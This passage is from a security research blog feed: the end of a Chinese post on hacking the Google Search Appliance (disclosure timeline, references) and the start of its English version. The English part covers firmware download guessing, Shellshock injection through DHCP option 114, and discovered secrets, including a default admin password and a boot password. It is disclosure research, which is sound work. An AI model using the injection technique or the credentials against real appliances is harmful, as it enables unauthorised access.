      &lt;td&gt;釋出 GSA 7.6.50.G36&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2017/07/28&lt;/td&gt;
      &lt;td&gt;釋出 GSA 7.6.50.G64&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2017/11/09&lt;/td&gt;
      &lt;td&gt;釋出 GSA 7.6.250.G12&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2017/12/28&lt;/td&gt;
      &lt;td&gt;最後能訂購 GSA 的日期&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2018/01/17&lt;/td&gt;
      &lt;td&gt;釋出 GSA 7.6.250.G20&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2018/03/21&lt;/td&gt;
      &lt;td&gt;釋出 GSA 7.6.250.G26&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2018/06/15&lt;/td&gt;
      &lt;td&gt;釋出 GSA 7.6.360.G10&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2018/10/08&lt;/td&gt;
      &lt;td&gt;釋出 GSA 7.6.360.G16&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2019/04/26&lt;/td&gt;
      &lt;td&gt;釋出 GSA 7.6.512.G18，應該為最後一個版本&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2021/08/16&lt;/td&gt;
      &lt;td&gt;回報漏洞&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2021/08/16&lt;/td&gt;
      &lt;td&gt;收到機器人回應確認收到回報信件&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2021/08/16&lt;/td&gt;
      &lt;td&gt;問題於 issuetracker.google.com 被指派&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2021/08/18&lt;/td&gt;
      &lt;td&gt;Google 提示漏洞不符合獎金條件，但會於下次會議再次討論&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2021/08/20&lt;/td&gt;
      &lt;td&gt;確認漏洞不發放獎金&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2021/11/01&lt;/td&gt;
      &lt;td&gt;詢問漏洞是否會指派 CVE 漏洞編號&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2021/11/02&lt;/td&gt;
      &lt;td&gt;確認不會有 CVE 漏洞編號&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2023 上半年&lt;/td&gt;
      &lt;td&gt;開始編寫文章&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2023/06/04&lt;/td&gt;
      &lt;td&gt;初稿完成&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h3 id=&quot;結論&quot;&gt;結論&lt;/h3&gt;

&lt;p&gt;雖然 GSA/vGSA 已經是結束生命周期的產品，但研究 Google 如何對設備去增加產品的安全性及減少攻擊向量
可以增加平常較少接觸的知識面。雖然文中沒有詳細說明，包含如使用 Java 的 Security Manager，
Linux Kernel 的 seccomp 都是 GSA 中有使用的技術，而本次研究中也留下一些可供後續研究的目標：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;feedergate 服務&lt;/li&gt;
  &lt;li&gt;Oracle 的 Outside-in Technology 轉換文件格式的記憶體漏洞&lt;/li&gt;
  &lt;li&gt;convert_to_html seccomp sandbox&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;有研究成果時再跟大家分享，下次見。&lt;/p&gt;

&lt;h3 id=&quot;其他參考網址&quot;&gt;其他參考網址&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf&quot;&gt;https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://opnsec.com/2018/07/into-the-borg-ssrf-inside-google-production-network/&quot;&gt;https://opnsec.com/2018/07/into-the-borg-ssrf-inside-google-production-network/&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.exploit-db.com/exploits/1333&quot;&gt;https://www.exploit-db.com/exploits/1333&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://commons.erau.edu/cgi/viewcontent.cgi?article=1153&amp;amp;context=jdfsl&quot;&gt;https://commons.erau.edu/cgi/viewcontent.cgi?article=1153&amp;amp;context=jdfsl&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.anandtech.com/show/2407&quot;&gt;https://www.anandtech.com/show/2407&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://groups.google.com/g/google-search-appliance-help/c/Qn5aO5r2Joo/m/PTw8ZDWu6vYJ&quot;&gt;https://groups.google.com/g/google-search-appliance-help/c/Qn5aO5r2Joo/m/PTw8ZDWu6vYJ&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/google/subpar&quot;&gt;https://github.com/google/subpar&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://insinuator.net/2016/03/classical-web-vulns-found-in-google-search-appliance-7-4/&quot;&gt;https://insinuator.net/2016/03/classical-web-vulns-found-in-google-search-appliance-7-4/&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/kubernetes/kubernetes/issues/57760#issuecomment-356466614&quot;&gt;https://github.com/kubernetes/kubernetes/issues/57760#issuecomment-356466614&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://nvd.nist.gov/vuln/detail/CVE-2014-0362&quot;&gt;https://nvd.nist.gov/vuln/detail/CVE-2014-0362&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.youtube.com/watch?v=un01LMLMuis&quot;&gt;https://www.youtube.com/watch?v=un01LMLMuis&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.youtube.com/watch?v=K-sEER8CK0U&quot;&gt;https://www.youtube.com/watch?v=K-sEER8CK0U&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://technical-fundas.blogspot.com/2016/05/google-search-appliance-migrate.html?&quot;&gt;http://technical-fundas.blogspot.com/2016/05/google-search-appliance-migrate.html?&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

</description>
                <link>https://devco.re/blog/2023/07/07/a-journey-into-hacking-google-search-appliance/</link>
                <guid>https://devco.re/blog/2023/07/07/a-journey-into-hacking-google-search-appliance</guid>
                <pubDate>Fri, 07 Jul 2023 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>[REL] A Journey Into Hacking Google Search Appliance</title>
                <description>&lt;p&gt;&lt;a href=&quot;/blog/2023/07/07/a-journey-into-hacking-google-search-appliance-en&quot;&gt;English Version&lt;/a&gt;, &lt;a href=&quot;/blog/2023/07/07/a-journey-into-hacking-google-search-appliance/&quot;&gt;中文版本&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;tldr&quot;&gt;TL;DR&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;GSA Admin console post-authentication Remote Code Execution.&lt;/li&gt;
  &lt;li&gt;GSA Search interface Path traversal.&lt;/li&gt;
  &lt;li&gt;GSA uses Oracle’s Outside-in Technology to convert documents.&lt;/li&gt;
  &lt;li&gt;Google Web services have some fixed URIs that provide information about the service itself.&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;introduction&quot;&gt;Introduction&lt;/h3&gt;

&lt;p&gt;The Google Search Appliance (hereinafter referred to as GSA) is an enterprise search device launched by Google in 2002, used for indexing and retrieving internal or public network information. Around 2005, Google introduced the Google Mini for personal and small business use. Later, at the end of 2008, a virtual machine version was launched, called the Virtual Google Search Appliance (hereinafter referred to as VGSA). However, at the end of 2018, Google ended the life cycle of the GSA product and integrated it into the Cloud Search product line.&lt;/p&gt;

&lt;h3 id=&quot;appliance-and-software-acquisition&quot;&gt;Appliance and Software Acquisition&lt;/h3&gt;

&lt;p&gt;We managed to purchase a device by searching “Google Search Appliance” on eBay.&lt;/p&gt;

&lt;p&gt;Luckily, the first one we bought was a GSA with unerased data:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20230707/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Even now, you can still find devices that are currently being sold.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20230707/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;On the other hand, The original public link of vGSA has been removed.
http://dl.google.com/vgsa/vgsa_20090210.7z [removed]
http://dl.google.com/vgsa/vgsa_20081028.7z [removed]&lt;/p&gt;

&lt;p&gt;We found the file on BitTorrent magnet link:&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;magnet:?xt=urn:btih:89388ACE8C3B91FDD3A2F86D8CBB78C58A70D992&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Next, found the link to the old version software from Google Groups:
https://groups.google.com/g/google-search-appliance-help/c/Qn5aO5r2Joo/m/PTw8ZDWu6vYJ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20230707/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The link was:&lt;/p&gt;

&lt;p&gt;http://dl.google.com/dl/enterprise/install_bundle-10000622-7.2.0-112.bin [removed]&lt;/p&gt;

&lt;p&gt;And we can obtain all version number from:
&lt;a href=&quot;http://web.archive.org/web/20210116194907/https://support.google.com/gsa/answer/7020590?hl=en&amp;amp;ref_topic=2709671&quot;&gt;http://web.archive.org/web/20210116194907/https://support.google.com/gsa/answer/7020590?hl=en&amp;amp;ref_topic=2709671&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Guessing the File Naming Rules as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;install_bundle-10000(3-digit numbers)-7.(numbers).(numbers)-(numbers).bin&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;And write a shell script to attempt downloading software:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;622&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;j&amp;lt;999&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;+j&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;do for&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;i&amp;lt;444&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;+i&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;do &lt;/span&gt;wget http://dl.google.com/dl/enterprise/install_bundle-10000&lt;span class=&quot;nv&quot;&gt;$j&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-7&lt;/span&gt;.2.0-&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;.bin&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;done
for&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;661&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;j&amp;lt;999&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;+j&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;do for&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;i&amp;lt;444&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;+i&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;do &lt;/span&gt;wget http://dl.google.com/dl/enterprise/install_bundle-10000&lt;span class=&quot;nv&quot;&gt;$j&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-7&lt;/span&gt;.4.0-&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;.bin&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;done
for&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;693&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;j&amp;lt;999&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;+j&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;do for&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;i&amp;lt;444&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;+i&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;do &lt;/span&gt;wget http://dl.google.com/dl/enterprise/install_bundle-10000&lt;span class=&quot;nv&quot;&gt;$j&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-7&lt;/span&gt;.6.0-&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;.bin&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Including the information found through internet search, successfully retrieved the following file:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;all_langs-lang-pack-2.1-1.bin
all_langs-lang-pack-2.2-1.bin
centos_patch_files-6.0.0-22.bin
centos_patch_files-6.14.0-28.bin
centos_patch_files-7.0.14-238.bin
centos_patch_files-7.2.0-252.bin
centos_patch_files-7.2.0-264.bin
centos_patch_files-7.2.0-270.bin
centos_patch_files-7.2.0-280.bin
centos_patch_files-7.2.0-286.bin
install_bundle-10000653-7.2.0-252.bin
install_bundle-10000658-7.2.0-264.bin
install_bundle-10000661-7.2.0-270.bin
install_bundle-10000681-7.4.0-64.bin
install_bundle-10000685-7.4.0-72.bin
install_bundle-10000686-7.4.0-74.bin
install_bundle-10000692-7.4.0-82.bin
install_bundle-10000762-7.6.0-36.bin
install_bundle-10000767-7.6.0-42.bin
install_bundle-10000772-7.6.0-46.bin
install_bundle-10000781-7.6.0-58.bin
install_bundle-10000810-7.6.50-30.bin
install_bundle-10000822-7.6.50-36.bin
install_bundle-10000855-7.6.50-64.bin
install_bundle-10000878-7.6.250-12.bin
install_bundle-10000888-7.6.250-20.bin
install_bundle-10000901-7.6.250-26.bin
install_bundle-10000915-7.6.360-10.bin
install_bundle-10000926-7.6.360-16.bin
install_bundle-10000967-7.6.512-18.bin
sw_files-5.0.4-22.bin
sw_files-6.14.0-28.bin
sw_files-7.0.14-238.bin
vm_patch_1_for_504_G22_and_G24_only.bin
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;vgsa-virtual-google-search-appliance&quot;&gt;vGSA (Virtual Google Search Appliance)&lt;/h3&gt;

&lt;p&gt;Next, we began research on vGSA. By default, after importing the virtual machine, 
this system only provides a function for network configuration and doesn’t provide a system shell for operation or use.
However, because the virtual machine operates within ours own environment,
it is usually possible to obtain system permissions through the following methods:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Directly altering unencrypted disk files&lt;/li&gt;
  &lt;li&gt;Modifying the virtual machine memory&lt;/li&gt;
  &lt;li&gt;Booting using CDs or disks from another operating system&lt;/li&gt;
  &lt;li&gt;Exploiting known vulnerabilities&lt;/li&gt;
  &lt;li&gt;Utilizing hard-coded administrator or system account passwords&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;The following image shows the network configuration screen:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20230707/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;cve-2014-6271&quot;&gt;CVE-2014-6271&lt;/h4&gt;

&lt;p&gt;When testing early Linux appliances and servers, especially those using the RedHat series operating system, 
there are often Shellshock vulnerabilities, and the 2008 released vGSA is no exception.
Inserting option 114 in the DHCP server will be set in the environment variable, 
thereby triggering the vulnerability and executing any command.&lt;/p&gt;

&lt;p&gt;The command attempted to be inserted is: 
&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;useradd zzzzgsa&lt;/code&gt;. 
This command can be observed to be executed repeatedly, as error messages continue to appear in the console output.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20230707/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;vgsa-operation-system-observation&quot;&gt;vGSA operation system observation&lt;/h4&gt;

&lt;p&gt;After successfully obtaining operating system privileges,
we can observe the network environment, 
the running applications, and the file system.
Here are some insights gained from observing the operating system environment:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Version number is 5.2.0.G.27.&lt;/li&gt;
  &lt;li&gt;Services are mainly written in C/C++, Java, Python.&lt;/li&gt;
  &lt;li&gt;/export/hda3 seems to be the directory primarily used by the service.&lt;/li&gt;
  &lt;li&gt;/etc/shadow contains the root account with password hash x███████████M.&lt;/li&gt;
  &lt;li&gt;Administration interface listening on port 8000, 8443 with default admin password, j0njlRXpU5CQ.&lt;/li&gt;
  &lt;li&gt;/.gnupg contains ent_box_key public and private keys.&lt;/li&gt;
  &lt;li&gt;/.gnupg contains google_license_key public key.&lt;/li&gt;
  &lt;li&gt;/.ssh/authorized_keys contains two sets of public keys.&lt;/li&gt;
  &lt;li&gt;/root/.ssh/authorized_keys contains one set of public keys.&lt;/li&gt;
  &lt;li&gt;/root/.ssh/ contains two sets of SSH public and private keys.&lt;/li&gt;
  &lt;li&gt;/root/.gnupg/ contains ent_box_key public and private keys.&lt;/li&gt;
  &lt;li&gt;Oracle’s Outside In Technology is used to convert documents into HTML web pages.&lt;/li&gt;
  &lt;li&gt;The Java runtime environment uses a Security Manager for protection.&lt;/li&gt;
  &lt;li&gt;The request for engineer support function uses ppp to build a virtual private network, /etc/ppp/chap-secrets contains account passwords ( z██████c、]███████T  ).&lt;/li&gt;
  &lt;li&gt;The boot menu password in /etc/lilo.conf is cmBalx7.&lt;/li&gt;
  &lt;li&gt;/export/hda3/versionmanager/google_key.symmetric has a string that seems to be used for symmetric encryption.&lt;/li&gt;
  &lt;li&gt;/export/hda3/versionmanager/vmanager_passwd contains two sets of username-password combinations ( admin： M█████████████████████████w=:9██=  google：w█████████████████████████o=:N██= ).&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Executable programs with network services are as follows:&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Listen Port&lt;/th&gt;
      &lt;th&gt;Process Name&lt;/th&gt;
      &lt;th&gt;Program Language&lt;/th&gt;
      &lt;th&gt;Function&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;22&lt;/td&gt;
      &lt;td&gt;ssh&lt;/td&gt;
      &lt;td&gt;C/C++&lt;/td&gt;
      &lt;td&gt;OpenSSH Server&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;53&lt;/td&gt;
      &lt;td&gt;named&lt;/td&gt;
      &lt;td&gt;C/C++&lt;/td&gt;
      &lt;td&gt;Bind Named&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;953&lt;/td&gt;
      &lt;td&gt;named&lt;/td&gt;
      &lt;td&gt;C/C++&lt;/td&gt;
      &lt;td&gt;Bind Named&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;1111&lt;/td&gt;
      &lt;td&gt;webserver_config&lt;/td&gt;
      &lt;td&gt;python&lt;/td&gt;
      &lt;td&gt;Installer&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2100&lt;/td&gt;
      &lt;td&gt;adminrunner.py&lt;/td&gt;
      &lt;td&gt;python&lt;/td&gt;
      &lt;td&gt;admin console backend&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;3990&lt;/td&gt;
      &lt;td&gt;monitor&lt;/td&gt;
      &lt;td&gt;C/C++&lt;/td&gt;
      &lt;td&gt;monitor&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;4000&lt;/td&gt;
      &lt;td&gt;rtserver&lt;/td&gt;
      &lt;td&gt;C/C++&lt;/td&gt;
      &lt;td&gt;unknown&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;4430&lt;/td&gt;
      &lt;td&gt;EnterpriseFrontend&lt;/td&gt;
      &lt;td&gt;Java (with security manager)&lt;/td&gt;
      &lt;td&gt;admin console frontend&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;4911&lt;/td&gt;
      &lt;td&gt;borgmon&lt;/td&gt;
      &lt;td&gt;C/C++&lt;/td&gt;
      &lt;td&gt;borgmon&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;4916&lt;/td&gt;
      &lt;td&gt;reactor&lt;/td&gt;
      &lt;td&gt;C/C++&lt;/td&gt;
      &lt;td&gt;unknown&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;5000&lt;/td&gt;
      &lt;td&gt;rtserver&lt;/td&gt;
      &lt;td&gt;C/C++&lt;/td&gt;
      &lt;td&gt;unknown&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;5600&lt;/td&gt;
      &lt;td&gt;rtserver&lt;/td&gt;
      &lt;td&gt;C/C++&lt;/td&gt;
      &lt;td&gt;unknown&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;6600&lt;/td&gt;
      &lt;td&gt;cacheserver&lt;/td&gt;
      &lt;td&gt;C/C++&lt;/td&gt;
      &lt;td&gt;unknown&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;7800&lt;/td&gt;
      &lt;td&gt;EnterpriseFrontend&lt;/td&gt;
      &lt;td&gt;Java (with security manager)&lt;/td&gt;
      &lt;td&gt;admin console frontend (http)&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;7880&lt;/td&gt;
      &lt;td&gt;TableServer&lt;/td&gt;
      &lt;td&gt;Java (with security manager)&lt;/td&gt;
      &lt;td&gt;unknown&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;7882&lt;/td&gt;
      &lt;td&gt;AuthzChecker&lt;/td&gt;
      &lt;td&gt;Java (without security manager)&lt;/td&gt;
      &lt;td&gt;unknown&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;7886&lt;/td&gt;
      &lt;td&gt;tomcat&lt;/td&gt;
      &lt;td&gt;Java&lt;/td&gt;
      &lt;td&gt;tomcat server&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;8000&lt;/td&gt;
      &lt;td&gt;EnterpriseAdminConsole&lt;/td&gt;
      &lt;td&gt;Java (without security manager)&lt;/td&gt;
      &lt;td&gt;unknown&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;8443&lt;/td&gt;
      &lt;td&gt;stunnel&lt;/td&gt;
      &lt;td&gt;C/C++&lt;/td&gt;
      &lt;td&gt;redirect http to https&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;8888&lt;/td&gt;
      &lt;td&gt;GWS&lt;/td&gt;
      &lt;td&gt;C/C++&lt;/td&gt;
      &lt;td&gt;unknown&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;9300&lt;/td&gt;
      &lt;td&gt;oneboxserver&lt;/td&gt;
      &lt;td&gt;C/C++&lt;/td&gt;
      &lt;td&gt;unknown&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;9328&lt;/td&gt;
      &lt;td&gt;entspellmixer&lt;/td&gt;
      &lt;td&gt;C/C++&lt;/td&gt;
      &lt;td&gt;unknown&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;9400&lt;/td&gt;
      &lt;td&gt;mixserver&lt;/td&gt;
      &lt;td&gt;C/C++&lt;/td&gt;
      &lt;td&gt;unknown&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;9402&lt;/td&gt;
      &lt;td&gt;mixserver&lt;/td&gt;
      &lt;td&gt;C/C++&lt;/td&gt;
      &lt;td&gt;unknown&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;9448&lt;/td&gt;
      &lt;td&gt;qrewrite&lt;/td&gt;
      &lt;td&gt;C/C++&lt;/td&gt;
      &lt;td&gt;unknown&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;9450&lt;/td&gt;
      &lt;td&gt;EnterpriseAdminConsole&lt;/td&gt;
      &lt;td&gt;Java (without security manager )&lt;/td&gt;
      &lt;td&gt;unknown&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;10094&lt;/td&gt;
      &lt;td&gt;enterprise_onebox&lt;/td&gt;
      &lt;td&gt;C/C++&lt;/td&gt;
      &lt;td&gt;unknown&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;10200&lt;/td&gt;
      &lt;td&gt;clustering_server&lt;/td&gt;
      &lt;td&gt;C/C++&lt;/td&gt;
      &lt;td&gt;unknown&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;11913&lt;/td&gt;
      &lt;td&gt;sessionmanager&lt;/td&gt;
      &lt;td&gt;C/C++&lt;/td&gt;
      &lt;td&gt;unknown&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;12345&lt;/td&gt;
      &lt;td&gt;RegistryServer&lt;/td&gt;
      &lt;td&gt;Java (without security manager)&lt;/td&gt;
      &lt;td&gt;unknown&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;19780&lt;/td&gt;
      &lt;td&gt;configmgr/ent_configmgr.py&lt;/td&gt;
      &lt;td&gt;python&lt;/td&gt;
      &lt;td&gt;unknown&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;19900&lt;/td&gt;
      &lt;td&gt;feedergate&lt;/td&gt;
      &lt;td&gt;C/C++&lt;/td&gt;
      &lt;td&gt;extract, transform and feed records&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;21200&lt;/td&gt;
      &lt;td&gt;FileSystemGateway&lt;/td&gt;
      &lt;td&gt;Java (with security manager)&lt;/td&gt;
